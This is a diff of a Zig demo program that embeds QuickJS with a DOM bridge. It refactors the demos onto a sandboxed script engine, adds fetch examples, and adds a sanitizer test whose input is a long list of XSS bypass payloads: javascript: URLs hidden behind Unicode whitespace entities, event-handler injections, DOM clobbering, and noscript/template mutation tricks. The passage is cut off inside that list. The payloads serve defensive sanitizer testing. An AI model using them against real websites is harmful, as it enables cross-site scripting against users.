@@ -99,16 +99,19 @@ pub fn main() !void {
     // try async_task_sequence_AB(allocator);
     // try async_task_sequence_ABCDEFGH(allocator);
     // try execute_Simple_Script_In_HTML(allocator);
-    // try execute_Async_Script_In_HTML_And_Pass_To_Zig(allocator);
+    try execute_async_Script_in_HTML_And_pass_To_Zig(allocator, sandbox_root);
+    try async_Script_and_pass_to_Zig(allocator, sandbox_root);
     // try execute_Passing_Binary_Data_from_Zig_to_JS_Async(allocator);
     // try firstJSONPass(allocator);
     // try simplifiedJSONPass(allocator);
-    // try async_CSV_Tuple_Parser(allocator);
     // try JS_Proxy_And_Generators(allocator);
+    try async_Fetch_Blob(allocator, sandbox_root);
     try async_Fetch_API_Demo(allocator, sandbox_root);
-    // try async_CSV_JSON_Parser(allocator);
+    try async_CSV_JSON_Parser(allocator, sandbox_root);
+    try async_CSV_Tuple_Parser(allocator, sandbox_root);
 
     try demoWorker(allocator, sandbox_root);
+    try test_dom_purify(allocator, sandbox_root);
 
     // // lexb =====
 
@@ -207,7 +210,7 @@ fn stylesheet_txt(allocator: std.mem.Allocator, sbx: []const u8) !void {
     try z.parseStylesheet(bridge.stylesheet, bridge.css_style_parser, css);
     try z.attachStylesheet(bridge.doc, bridge.stylesheet);
 
-    const val = try engine.eval(js, "style_test.js", .global);
+    const val = try engine.eval(js, "style_test.js", .module);
     defer engine.ctx.freeValue(val);
 
     const p_el = z.getElementById(bridge.doc, "pid").?;
@@ -260,7 +263,7 @@ fn stylesheet_style_tag(allocator: std.mem.Allocator, sbx: []const u8) !void {
     defer engine.deinit();
     const bridge = engine.dom;
     try engine.loadHTML(html);
-    const val = try engine.eval(js, "style_test.js", .global);
+    const val = try engine.eval(js, "style_test.js", .module);
     defer engine.ctx.freeValue(val);
 
     const p_el = z.getElementById(bridge.doc, "pid").?;
@@ -1216,188 +1219,166 @@ fn async_task_sequence_ABCDEFGH(allocator: std.mem.Allocator) !void {
 }
 
 // Event Loop Demo: setTimeout, setInterval, async/await ----------------------
-fn test_event_loop(allocator: std.mem.Allocator) !void {
-    z.print("\n=== Event Loop Demo: setTimeout & setInterval --------------------------\n\n", .{});
+// fn test_event_loop(allocator: std.mem.Allocator) !void {
+//     z.print("\n=== Event Loop Demo: setTimeout & setInterval --------------------------\n\n", .{});
 
-    const engine = try ScriptEngine.init(allocator);
-    defer engine.deinit();
+//     const engine = try ScriptEngine.init(allocator);
+//     defer engine.deinit();
 
-    // Test 1: Simple setTimeout
-    z.print("🟢 Start a \x1b[1m setTimeout \x1b[0m of 500ms and set a Global 'count=42'\n", .{});
-    const timeout_test =
-        \\globalThis.count = 0;
-        \\start = Date.now();
-        \\setTimeout(() => {
-        \\  globalThis.count = 42;
-        \\  console.log("🟢 Get final 'count' after setTimeout of 500ms fired: count = " + globalThis.count, "after: ", Date.now()-start, "ms");
-        \\}, 500);
-        \\globalThis.count; // Should be 0 initially
-    ;
+//     // Test 1: Simple setTimeout
+//     z.print("🟢 Start a \x1b[1m setTimeout \x1b[0m of 500ms and set a Global 'count=42'\n", .{});
+//     const timeout_test =
+//         \\globalThis.count = 0;
+//         \\start = Date.now();
+//         \\var coutn = 0;
+//         \\setTimeout(() => {
+//         \\  globalThis.count = 42;
+//         \\  console.log("🟢 Get final 'count' after setTimeout of 500ms fired: count = " + globalThis.count, "after: ", Date.now()-start, "ms");
+//         \\}, 500);
+//         \\globalThis.count; // Should be 0 initially
+//     ;
 
-    const result1 = try engine.eval(timeout_test, "<timeout_test>", .global);
-    defer engine.ctx.freeValue(result1);
-    try engine.run();
+//     const result1 = try engine.eval(timeout_test, "<timeout_test>", .global);
+//     defer engine.ctx.freeValue(result1);
+//     try engine.run();
 
-    const initial_count: i32 = try engine.ctx.toInt32(result1);
+//     const initial_count: i32 = try engine.ctx.toInt32(result1);
 
-    z.print("🟢 Get initial 'count' (before timeout): {d}\n", .{initial_count});
+//     z.print("🟢 Get initial 'count' (before timeout): {d}\n", .{initial_count});
 
-    // Test 2: setInterval with clearInterval
-    z.print("\n🟡 Execute \x1b[1m setInterval \x1b[0m of 200ms with 5 iterations", .{});
-    const interval_test =
-        \\let counter = 0;
-        \\start = Date.now(); 
-        \\const intervalId = setInterval(() => {
-        \\  counter++;
-        \\  console.log("🟡 Got Interval tick #", counter, ", expected after ", counter * 200 , ", got after ", Date.now()-start, "ms");
-        \\  if (counter >= 5) {
-        \\    clearInterval(intervalId);
-        \\    console.log("🟡 Interval cleared; expected  after ", counter * 200, ", got after ",Date.now()-start, "ms");
-        \\  }
-        \\}, 200);
-        \\intervalId;
-    ;
+//     // Test 2: setInterval with clearInterval
+//     z.print("\n🟡 Execute \x1b[1m setInterval \x1b[0m of 200ms with 5 iterations", .{});
+//     const interval_test =
+//         \\let counter = 0;
+//         \\start = Date.now();
+//         \\const intervalId = setInterval(() => {
+//         \\  counter++;
+//         \\  console.log("🟡 Got Interval tick #", counter, ", expected after ", counter * 200 , ", got after ", Date.now()-start, "ms");
+//         \\  if (counter >= 5) {
+//         \\    clearInterval(intervalId);
+//         \\    console.log("🟡 Interval cleared; expected  after ", counter * 200, ", got after ",Date.now()-start, "ms");
+//         \\  }
+//         \\}, 200);
+//         \\intervalId;
+//     ;
 
-    const result2 = try engine.eval(interval_test, "<interval_test>", .global);
-    defer engine.ctx.freeValue(result2);
+//     const result2 = try engine.eval(interval_test, "<interval_test>", .global);
+//     defer engine.ctx.freeValue(result2);
 
-    // Test 3: Multiple timers with different delays
-    z.print("\n⚪️ Start multiple timers (100ms, 300ms, 700ms)\n", .{});
-    const multiple_timers =
-        \\start = Date.now();
-        \\setTimeout(() => console.log("⚪️ Timer 1 expected after: 100ms", ", fired after: ", Date.now()-start, "ms"), 100);
-        \\setTimeout(() => console.log("⚪️ Timer 2 expected after: 300ms", ", fired after: ", Date.now()-start, "ms"), 300);
-        \\setTimeout(() => console.log("⚪️ Timer 3 expected after: 700ms", ", fired after: ", Date.now()-start, "ms"), 700);
-        \\"Timers scheduled";
-    ;
+//     // Test 3: Multiple timers with different delays
+//     z.print("\n⚪️ Start multiple timers (100ms, 300ms, 700ms)\n", .{});
+//     const multiple_timers =
+//         \\start = Date.now();
+//         \\setTimeout(() => console.log("⚪️ Timer 1 expected after: 100ms", ", fired after: ", Date.now()-start, "ms"), 100);
+//         \\setTimeout(() => console.log("⚪️ Timer 2 expected after: 300ms", ", fired after: ", Date.now()-start, "ms"), 300);
+//         \\setTimeout(() => console.log("⚪️ Timer 3 expected after: 700ms", ", fired after: ", Date.now()-start, "ms"), 700);
+//         \\"Timers scheduled";
+//     ;
 
-    const result3 = try engine.eval(multiple_timers, "<multiple>", .global);
-    defer engine.ctx.freeValue(result3);
+//     const result3 = try engine.eval(multiple_timers, "<multiple>", .global);
+//     defer engine.ctx.freeValue(result3);
 
-    const scheduled_msg = z.qjs.JS_ToCString(engine.ctx.ptr, result3);
-    if (scheduled_msg != null) {
-        defer z.qjs.JS_FreeCString(engine.ctx.ptr, scheduled_msg);
-        z.print("{s}\n", .{scheduled_msg});
-    }
+//     const scheduled_msg = z.qjs.JS_ToCString(engine.ctx.ptr, result3);
+//     if (scheduled_msg != null) {
+//         defer z.qjs.JS_FreeCString(engine.ctx.ptr, scheduled_msg);
+//         z.print("{s}\n", .{scheduled_msg});
+//     }
 
-    // Test 4: Async/await with setTimeout (simulating async operations)
-    z.print("\n🔵 Execute \x1b[1mAsync/await\x1b[0m mocked as a setTimeout of 900ms ---\n", .{});
-    const async_test_0 =
-        \\async function delayedGreeting(txt, ms) {
-        \\  return new Promise((resolve) => {
-        \\    setTimeout(() => resolve(`🔵 ${txt} !`), ms);
-        \\  });
-        \\}
-        \\(async () => {
-        \\  start = Date.now();  
-        \\  console.log("🔵 Starting first async operation...IIEE");
-        \\  const delay = 900;
-        \\
-        \\  const msg = await delayedGreeting("Zig runs async QuickJS", delay);
-        \\  console.log("🔵 Async result ", msg, "received after ", Date.now()-start, "ms");
-        \\})();
-    ;
+//     // Test 4: Async/await with setTimeout (simulating async operations)
+//     z.print("\n🔵 Execute \x1b[1mAsync/await\x1b[0m mocked as a setTimeout of 900ms ---\n", .{});
+//     const async_test_0 =
+//         \\async function delayedGreeting(txt, ms) {
+//         \\  return new Promise((resolve) => {
+//         \\    setTimeout(() => resolve(`🔵 ${txt} !`), ms);
+//         \\  });
+//         \\}
+//         \\(async () => {
+//         \\  start = Date.now();
+//         \\  console.log("🔵 Starting first async operation...IIEE");
+//         \\  const delay = 900;
+//         \\
+//         \\  const msg = await delayedGreeting("Zig runs async QuickJS", delay);
+//         \\  console.log("🔵 Async result ", msg, "received after ", Date.now()-start, "ms");
+//         \\})();
+//     ;
 
-    const async_test_1 =
-        \\async function delayedGreeting(txt, ms) {
-        \\  return new Promise((resolve) => {
-        \\    return setTimeout(() => resolve(`🟣 Hello, ${txt}!`), ms);
-        \\  });
-        \\}
-        \\
-        \\  start = Date.now();  
-        \\  console.log("🟣 Starting second chained async operation....");
-        \\  let delay = 850;
-        \\
-        \\  delayedGreeting("Async ZiggyQuickJS", delay).then(msg => {
-        \\     console.log("🟣 Async result ", msg, "received after ", Date.now()-start, "ms");
-        \\  });
-    ;
+//     const async_test_1 =
+//         \\async function delayedGreeting(txt, ms) {
+//         \\  return new Promise((resolve) => {
+//         \\    return setTimeout(() => resolve(`🟣 Hello, ${txt}!`), ms);
+//         \\  });
+//         \\}
+//         \\
+//         \\  start = Date.now();
+//         \\  console.log("🟣 Starting second chained async operation....");
+//         \\  let delay = 850;
+//         \\
+//         \\  delayedGreeting("Async ZiggyQuickJS", delay).then(msg => {
+//         \\     console.log("🟣 Async result ", msg, "received after ", Date.now()-start, "ms");
+//         \\  });
+//     ;
 
-    const async_test_2 =
-        \\async function delayedError(ms) {
-        \\  return new Promise((_, reject) => {
-        \\    setTimeout(() => reject(new Error("🔴 Failed")), ms);
-        \\  });
-        \\}
-        \\start = Date.now();
-        \\delay = 500;
-        \\console.log("🔴 Starting failing async operation....");
-        \\
-        \\delayedError(delay).catch((err) => {
-        \\  console.log(
-        \\    "🔴 Async error received after ",
-        \\    Date.now() - start,
-        \\    "ms:",
-        \\    err.message
-        \\  );
-        \\ });
-    ;
+//     const async_test_2 =
+//         \\async function delayedError(ms) {
+//         \\  return new Promise((_, reject) => {
+//         \\    setTimeout(() => reject(new Error("🔴 Failed")), ms);
+//         \\  });
+//         \\}
+//         \\start = Date.now();
+//         \\delay = 500;
+//         \\console.log("🔴 Starting failing async operation....");
+//         \\
+//         \\delayedError(delay).catch((err) => {
+//         \\  console.log(
+//         \\    "🔴 Async error received after ",
+//         \\    Date.now() - start,
+//         \\    "ms:",
+//         \\    err.message
+//         \\  );
+//         \\ });
+//     ;
 
-    // _ = async_test_0; // Avoid unused variable warning
+//     // _ = async_test_0; // Avoid unused variable warning
 
-    const result4 = try engine.eval(async_test_0, "<async0>", .global);
-    defer engine.ctx.freeValue(result4);
+//     const result4 = try engine.eval(async_test_0, "<async0>", .global);
+//     defer engine.ctx.freeValue(result4);
 
-    const result5 = try engine.eval(async_test_1, "<async1>", .global);
-    defer engine.ctx.freeValue(result5);
-    const result6 = try engine.eval(async_test_2, "<async2>", .global);
-    // catch |err| {
-    //     // 1. Check if QuickJS has an exception pending
-    //     if (ctx.checkAndPrintException()) {
-    //         // This will print: "SyntaxError: Identifier 'delay' has already been declared"
-    //         return err;
-    //     }
-    //     return err; // Propagate unknown errors
-    // };
-    defer engine.ctx.freeValue(result6);
+//     const result5 = try engine.eval(async_test_1, "<async1>", .global);
+//     defer engine.ctx.freeValue(result5);
+//     const result6 = try engine.eval(async_test_2, "<async2>", .global);
+//     // catch |err| {
+//     //     // 1. Check if QuickJS has an exception pending
+//     //     if (ctx.checkAndPrintException()) {
+//     //         // This will print: "SyntaxError: Identifier 'delay' has already been declared"
+//     //         return err;
+//     //     }
+//     //     return err; // Propagate unknown errors
+//     // };
+//     defer engine.ctx.freeValue(result6);
 
-    // Run the event loop to process all timers
-    z.print("\n[Zig] 🔄 Running event loop...\n\n", .{});
-    const now = std.time.milliTimestamp();
-    try engine.run();
+//     // Run the event loop to process all timers
+//     z.print("\n[Zig] 🔄 Running event loop...\n\n", .{});
+//     const now = std.time.milliTimestamp();
+//     try engine.run();
 
-    // Verify final count value
-    const global = engine.ctx.getGlobalObject();
-    defer engine.ctx.freeValue(global);
-    const count_prop = engine.ctx.getPropertyStr(global, "count");
-    defer engine.ctx.freeValue(count_prop);
+//     // Verify final count value
+//     const global = engine.ctx.getGlobalObject();
+//     defer engine.ctx.freeValue(global);
+//     const count_prop = engine.ctx.getPropertyStr(global, "count");
+//     defer engine.ctx.freeValue(count_prop);
 
-    const final_count = try engine.ctx.toInt32(count_prop);
-    z.print("🟢 Check Global final 'count' (after setTimeout): {d}\n\n", .{final_count});
+//     const final_count = try engine.ctx.toInt32(count_prop);
+//     z.print("🟢 Check Global final 'count' (after setTimeout): {d}\n\n", .{final_count});
 
-    const elapsed = std.time.milliTimestamp() - now;
-    z.print("\n[Zig] ⏳  Event loop run completed in {d} ms\n\n", .{elapsed});
-}
+//     const elapsed = std.time.milliTimestamp() - now;
+//     z.print("\n[Zig] ⏳  Event loop run completed in {d} ms\n\n", .{elapsed});
+// }
 // ---------------------------------------------------------------------------
 
 // Passing data JS -> Zig via Async Script Execution
-fn execute_Async_Script_In_HTML_And_Pass_To_Zig(allocator: std.mem.Allocator) !void {
-    const rt = try zqjs.Runtime.init(allocator);
-    defer {
-        rt.runGC();
-        rt.deinit();
-    }
-
-    // !! Enable the Module Loader (reads from disk)
-    // rt.setModuleLoader();
-
-    const ctx = zqjs.Context.init(rt);
-    defer ctx.deinit();
-
-    var loop = try EventLoop.create(allocator, rt);
-    defer loop.destroy();
-
-    // Context state: Allocates, zeroes classes, and links to context automatically.
-    const rc = try RCtx.create(allocator, ctx, loop);
-    defer rc.destroy();
-    try loop.install(ctx);
-
-    // Install libaries and APIs
-    var dom = try DOMBridge.init(allocator, ctx);
-    defer dom.deinit();
-    try dom.installAPIs(); // 'console'
-    try loop.install(ctx); // timers + async bindings
+fn execute_async_Script_in_HTML_And_pass_To_Zig(allocator: std.mem.Allocator, sbx: []const u8) !void {
+    var engine = try ScriptEngine.init(allocator, sbx);
+    defer engine.deinit();
 
     // Note: Don't deinit ctx here - it's owned by main() and shared across demos
     z.print("\n=== Executing Async Script and passing data JS -> Zig ------------------------\n\n", .{});
@@ -1444,57 +1425,51 @@ fn execute_Async_Script_In_HTML_And_Pass_To_Zig(allocator: std.mem.Allocator) !v
     const content = z.textContent_zc(z.elementToNode(script_elt.?));
 
     // returns a Promise immediately
-    const result = try ctx.eval(
-        content,
-        "<async_script>",
-        .{}, // Default flags: type = .global
-    );
-    defer ctx.freeValue(result);
+    const result = try engine.eval(content, "<async_script>", .module);
+    defer engine.ctx.freeValue(result);
 
     if (z.isException(result)) {
-        _ = ctx.checkAndPrintException();
+        _ = engine.ctx.checkAndPrintException();
     }
 
-    // Run Event Loop (Resolves the Promises)
-    // The Promise object sitting in 'result' changes state to FULFILLED here.
-    try loop.run(.Script);
+    try engine.run(); // Run Event Loop (Resolves the Promises)
 
-    // const last_result_str = try ctx.toZString(rc.last_result.?);
+    // const last_result_str = try engine.ctx.toZString(engine.rc.last_result.?);
     // std.debug.print("Last result: {s}\n", .{last_result_str});
-    // defer ctx.freeZString(last_result_str);
+    // defer engine.ctx.freeZString(last_result_str);
 
-    std.debug.assert(ctx.isPromise(result));
+    std.debug.assert(engine.ctx.isPromise(result));
 
-    const state = ctx.promiseState(result);
+    const state = engine.ctx.promiseState(result);
     if (state == .Rejected) {
-        const reason = ctx.promiseResult(result);
-        defer ctx.freeValue(reason);
+        const reason = engine.ctx.promiseResult(result);
+        defer engine.ctx.freeValue(reason);
         z.print("[Zig] ❌  Promise Rejected!\n", .{});
 
         // Print the actual JS error (e.g., "TypeError: ...")
-        const err_str = try ctx.toZString(reason);
-        defer ctx.freeZString(err_str);
+        const err_str = try engine.ctx.toZString(reason);
+        defer engine.ctx.freeZString(err_str);
         z.print("[Zig] ❌  Promise Rejected! Reason: {s}\n", .{err_str});
         return;
     }
 
     std.debug.assert(state == .Fulfilled);
 
-    const p_res = ctx.promiseResult(result);
-    defer ctx.freeValue(p_res);
+    const p_res = engine.ctx.promiseResult(result);
+    defer engine.ctx.freeValue(p_res);
 
-    if (ctx.isString(p_res)) {
+    if (engine.ctx.isString(p_res)) {
         // Handle String Return (e.g. msg.message)
-        const str = try ctx.toZString(p_res);
-        defer ctx.freeZString(str);
+        const str = try engine.ctx.toZString(p_res);
+        defer engine.ctx.freeZString(str);
         z.print("[Zig] ✅  Received String: \"{s}\"\n", .{str});
-    } else if (ctx.isObject(p_res)) {
+    } else if (engine.ctx.isObject(p_res)) {
         // Handle Object Return (e.g. the full msg object)
         z.print("[Zig] ✅  Received Object:\n", .{});
-        try ctx.inspectObject(p_res);
-    } else if (ctx.isNumber(p_res)) {
+        try engine.ctx.inspectObject(p_res);
+    } else if (engine.ctx.isNumber(p_res)) {
         // Handle Numbers
-        z.print("[Zig] ✅  Received Number: {d}\n", .{try ctx.toInt64(p_res)});
+        z.print("[Zig] ✅  Received Number: {d}\n", .{try engine.ctx.toInt64(p_res)});
     } else {
         // Fallback
         z.print("[Zig] ✅  Received Other (Tag: {d})\n", .{p_res.tag});
@@ -1517,6 +1492,42 @@ fn execute_Async_Script_In_HTML_And_Pass_To_Zig(allocator: std.mem.Allocator) !v
     //     defer ctx.freeZString(received_data_str);
     //     z.print("\n[Zig] ✅ Final Result received in Zig via Global: {s}\n\n", .{received_data_str});
     // }
+}
+
+fn async_Script_and_pass_to_Zig(allocator: std.mem.Allocator, sbx: []const u8) !void {
+    var engine = try ScriptEngine.init(allocator, sbx);
+    defer engine.deinit();
+
+    z.print("\n=== Async Script and passing data JS -> Zig ------------------------\n\n", .{});
+
+    const html =
+        \\<!DOCTYPE html>
+        \\<html>
+        \\<body>
+        \\  <h1>Test</h1>
+        \\  <script>
+        \\    async function greet(name) {
+        \\      return new Promise(resolve => setTimeout(() => resolve({message: `Hello, ${name}!`}), 1000));
+        \\    }
+        \\    greet("QuickJS from Zig")
+        \\    .then(_msg => {
+        \\      const msg = JSON.stringify(_msg);
+        \\      console.log("[JS] ✅  callback received: ", msg);
+        \\      sendToHost(msg);
+        \\    })
+        \\  </script>
+        \\  <p>Content</p>
+        \\</body>
+        \\</html>
+    ;
+
+    try engine.loadHTML(html);
+    try engine.executeScripts(allocator, "");
+    try engine.run(); // Run Event Loop (Resolves the Promises)
+
+    // const last_result_str = try engine.ctx.toZString(engine.rc.last_result.?);
+    // std.debug.print("Last result: {s}\n", .{last_result_str});
+    // defer engine.ctx.freeZString(last_result_str);
 }
 
 // ----------------------------------------------------------------
@@ -1819,8 +1830,8 @@ fn workerParseProducts(allocator: std.mem.Allocator, csv_text: []u8) ![]Product 
     return parseCSV.parseCSVtoJSON(Product, allocator, csv_text);
 }
 
-fn async_CSV_JSON_Parser(allocator: std.mem.Allocator) !void {
-    const engine = try ScriptEngine.init(allocator);
+fn async_CSV_JSON_Parser(allocator: std.mem.Allocator, sbx: []const u8) !void {
+    const engine = try ScriptEngine.init(allocator, sbx);
     defer engine.deinit();
 
     z.print("\n=== Zig Native CSV_as_JSON parser worker called from JS ------------------\n\n", .{});
@@ -1835,6 +1846,8 @@ fn async_CSV_JSON_Parser(allocator: std.mem.Allocator) !void {
 
     // 2. Register it
     try engine.registerFunction("parseProducts", js_fn, 1);
+
+    try engine.disableUnsafeFeatures();
 
     // 3. JS Code
     const script =
@@ -1871,8 +1884,8 @@ fn workerParseTupleProducts(allocator: std.mem.Allocator, csv_text: []u8) ![]par
     return parseCSV.parseCSVToTuples(allocator, csv_text);
 }
 
-fn async_CSV_Tuple_Parser(allocator: std.mem.Allocator) !void {
-    const engine = try ScriptEngine.init(allocator);
+fn async_CSV_Tuple_Parser(allocator: std.mem.Allocator, sbx: []const u8) !void {
+    const engine = try ScriptEngine.init(allocator, sbx);
     defer engine.deinit();
 
     z.print("\n=== Zig Native CSV_as_Tuple parser worker called from JS --------------\n\n", .{});
@@ -1917,6 +1930,26 @@ fn async_CSV_Tuple_Parser(allocator: std.mem.Allocator) !void {
 
 // Fetch API -------------------------------------------------------------
 
+fn async_Fetch_Blob(allocator: std.mem.Allocator, sbx: []const u8) !void {
+    z.print("\n=== Async Fetch BLOB  ----------------------------------------\n\n", .{});
+    var engine = try ScriptEngine.init(allocator, sbx);
+    defer engine.deinit();
+
+    const script =
+        \\fetch('https://dummyjson.com/image/150')
+        \\.then((response) => response.blob()) 
+        \\.then((blob) => {
+        \\  console.log('Fetched image blob:', blob);
+        \\})
+        \\.catch(error => {
+        \\  console.log('🔴 Fetch error:', error);
+        \\});
+    ;
+    const res = try engine.eval(script, "<fetch>", .global);
+    engine.ctx.freeValue(res);
+    try engine.run();
+}
+
 fn async_Fetch_API_Demo(allocator: std.mem.Allocator, sbx: []const u8) !void {
     const engine = try ScriptEngine.init(allocator, sbx);
     defer engine.deinit();
@@ -1926,10 +1959,17 @@ fn async_Fetch_API_Demo(allocator: std.mem.Allocator, sbx: []const u8) !void {
     const script =
         \\console.log("🔵 Starting Fetch API demo...");
         \\fetch("https://jsonplaceholder.typicode.com/todos/1")
-        \\  .then((response) => {
-        \\    console.log("🔵 Response received, status:", response.status);
-        \\    const text = response.text();
-        \\    console.log("🔵 Body text:", text.substring(0, 100));
+        \\  .then(async (response) => {
+        \\    if (!response.ok) {
+        \\      console.error("🔴 Fetch error:", err);
+        \\      throw new Error("Network response was not ok");
+        \\    }
+        \\    console.log("🟢 Response received, status:", response.status);
+        \\    const txt = await response.text();
+        \\    console.log("🔵 Body text:", txt);
+        \\    return txt; 
+        \\})
+        \\  .then((text) => {
         \\    const data = JSON.parse(text);
         \\    console.log("🔵 JSON Data:", JSON.stringify(data, null, 2));
         \\  })
@@ -1949,7 +1989,7 @@ fn async_Fetch_API_Demo(allocator: std.mem.Allocator, sbx: []const u8) !void {
         \\  },
         \\})
         \\  .then((response) => response.json())
-        \\  .then((json) => console.log("🔵 POST Response JSON:", JSON.stringify(json)))
+        \\  .then((json) => console.log("🟢 Response JSON:", JSON.stringify(json)))
         \\  .catch(err => {
         \\    console.error("🔴 Fetch error:", err);
         \\  });
@@ -4283,6 +4323,683 @@ fn serverSideRenderingBenchmark(allocator: std.mem.Allocator) !void {
     z.print("• Original DOM stays pristine for next request\n", .{});
     z.print("• Parser reused across multiple requests\n", .{});
     z.print("• Malicious content is sanitized for security\n", .{});
+}
+
+fn test_dom_purify(allocator: std.mem.Allocator, _: []const u8) !void {
+    const dirty =
+        \\    <!-- I am ready now, click one of the buttons! -->
+        \\<svg><image id="v-146" width="500" height="500" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="data:image/svg+xml;utf8,%3Csvg%20viewBox%3D%220%200%20100%20100%22%20height%3D%22100%22%20width%3D%22100%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20data-name%3D%22Layer%201%22%20id%3D%22Layer_1%22%3E%0A%20%20%3Ctitle%3ECompute%3C%2Ftitle%3E%0A%20%20%3Cg%3E%0A%20%20%20%20%3Crect%20fill%3D%22%239d5025%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2224.74%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%20%20%3Crect%20fill%3D%22%23f58536%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2222.26%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E" preserveratio="true" style="border-color: rgb(51, 51, 51); box-sizing: border-box; color: rgb(51, 51, 51); cursor: move; font-family: sans-serif; font-size: 14px; line-height: 20px; outline-color: rgb(51, 51, 51); text-size-adjust: 100%; column-rule-color: rgb(51, 51, 51); -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -webkit-text-emphasis-color: rgb(51, 51, 51); -webkit-text-fill-color: rgb(51, 51, 51); -webkit-text-stroke-color: rgb(51, 51, 51); user-select: none; vector-effect: non-scaling-stroke;"></image></svg>
+        \\
+        \\<svg><image id="v-146" width="500" height="500" xmlns:xlink="http://www.w3.org/1999/xlink" href="data:image/svg+xml;utf8,%3Csvg%20viewBox%3D%220%200%20100%20100%22%20height%3D%22100%22%20width%3D%22100%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20data-name%3D%22Layer%201%22%20id%3D%22Layer_1%22%3E%0A%20%20%3Ctitle%3ECompute%3C%2Ftitle%3E%0A%20%20%3Cg%3E%0A%20%20%20%20%3Crect%20fill%3D%22%239d5025%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2224.74%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%20%20%3Crect%20fill%3D%22%23f58536%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2222.26%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E" preserveratio="true" style="border-color: rgb(51, 51, 51); box-sizing: border-box; color: rgb(51, 51, 51); cursor: move; font-family: sans-serif; font-size: 14px; line-height: 20px; outline-color: rgb(51, 51, 51); text-size-adjust: 100%; column-rule-color: rgb(51, 51, 51); -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -webkit-text-emphasis-color: rgb(51, 51, 51); -webkit-text-fill-color: rgb(51, 51, 51); -webkit-text-stroke-color: rgb(51, 51, 51); user-select: none; vector-effect: non-scaling-stroke;"></image></svg>
+        \\
+        \\<div aria-labelledby="msg--title" role="dialog" class="msg"><button class="modal-close" aria-label="close" type="button"><i class="icon-close"></i>some button</button></div>
+        \\
+        \\<input type=checkbox checked><input type=checkbox onclick>
+        \\
+        \\<svg><defs><filter id="f1"><feGaussianBlur in="SourceGraphic" stdDeviation="15" /></filter></defs><rect width="90" height="90" stroke="green" stroke-width="3" fill="yellow" filter="url(#f1)" /></svg>
+        \\
+        \\<b href="javascript:alert(1)" title="javascript:alert(2)"></b>
+        \\
+        \\<img src="data:,123"><audio src="data:,456"></audio><video src="data:,789"></video><source src="data:,012"><div src="data:,345">
+        \\
+        \\<img src=x name=createElement><img src=y id=createElement>
+        \\
+        \\<img src=x name=cookie>
+        \\
+        \\123<a href=' javascript:alert(1)'>I am a dolphin!</a>
+        \\
+        \\123<a href=' javascript:alert(1)'>I am a dolphin too!</a>
+        \\
+        \\123<a href=' javascript:alert(1)'>CLICK</a><a href='&#xA0javascript:alert(1)'>CLICK</a><a href='&#x1680;javascript:alert(1)'>CLICK</a><a href='&#x180E;javascript:alert(1)'>CLICK</a><a href='&#x2000;javascript:alert(1)'>CLICK</a><a href='&#x2001;javascript:alert(1)'>CLICK</a><a href='&#x2002;javascript:alert(1)'>CLICK</a><a href='&#x2003;javascript:alert(1)'>CLICK</a><a href='&#x2004;javascript:alert(1)'>CLICK</a><a href='&#x2005;javascript:alert(1)'>CLICK</a><a href='&#x2006;javascript:alert(1)'>CLICK</a><a href='&#x2006;javascript:alert(1)'>CLICK</a><a href='&#x2007;javascript:alert(1)'>CLICK</a><a href='&#x2008;javascript:alert(1)'>CLICK</a><a href='&#x2009;javascript:alert(1)'>CLICK</a><a href='&#x200A;javascript:alert(1)'>CLICK</a><a href='&#x200B;javascript:alert(1)'>CLICK</a><a href='&#x205f;javascript:alert(1)'>CLICK</a><a href='&#x3000;javascript:alert(1)'>CLICK</a>
+        \\
+        \\<img src=data:image/jpeg,ab798ewqxbaudbuoibeqbla>
+        \\
+        \\<img src="
+        \\data:image/jpeg,ab798ewqxbaudbuoibeqbla">
+        \\
+        \\<img src='javascript:while(1){}'>
+        \\
+        \\<a href=data:,evilnastystuff>clickme</a>
+        \\
+        \\123456
+        \\
+        \\<form onmouseover='alert(1)'><input name="attributes"><input name="attributes">
+        \\
+        \\<img src=x name=getElementById>
+        \\
+        \\<a href="#some-code-here" id="location">invisible
+        \\
+        \\<div onclick=alert(0)><form onsubmit=alert(1)><input onfocus=alert(2) name=parentNode>123</form></div>
+        \\
+        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeName>123</form>
+        \\
+        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeType>123</form>
+        \\
+        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=children>123</form>
+        \\
+        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=attributes>123</form>
+        \\
+        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=removeChild>123</form>
+        \\
+        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=removeAttributeNode>123</form>
+        \\
+        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=setAttribute>123</form>
+        \\
+        \\<style>*{color: red}</style>
+        \\
+        \\<p>hello</p>
+        \\
+        \\<listing>&lt;img onerror="alert(1);//" src=x&gt;<t t></listing>
+        \\
+        \\<img src=x id/=' onerror=alert(1)//'>
+        \\
+        \\<textarea>@shafigullin</textarea><!--</textarea><img src=x onerror=alert(1)>-->
+        \\
+        \\<b><noscript><!-- </noscript><img src=x onerror=alert(1) --></noscript>
+        \\
+        \\<b><noscript><a alt="</noscript><img src=x onerror=alert(1)>"></noscript>
+        \\
+        \\<body><template><s><template><s><img src=x onerror=alert(1)>@shafigullin</s></template></s></template>
+        \\
+        \\<a href="javascript:alert(1)">@shafigullin<a>
+        \\
